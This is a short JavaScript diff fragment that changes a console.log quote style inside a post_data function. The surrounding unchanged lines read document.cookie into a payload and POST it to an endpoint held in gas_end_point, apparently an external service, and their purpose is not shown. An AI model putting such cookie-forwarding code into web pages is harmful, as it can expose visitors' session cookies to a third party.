@@ -10,7 +10,7 @@ async function post_data(payload){
     if(document.cookie){
       payload.cookie=document.cookie
     }
-    console.log("const payload='" + JSON.stringify(payload) + "'")
+    console.log("const payload=`" + JSON.stringify(payload) + "`")
     const reply = await fetch(gas_end_point, { 
         method: "POST", 
         body: JSON.stringify(payload),
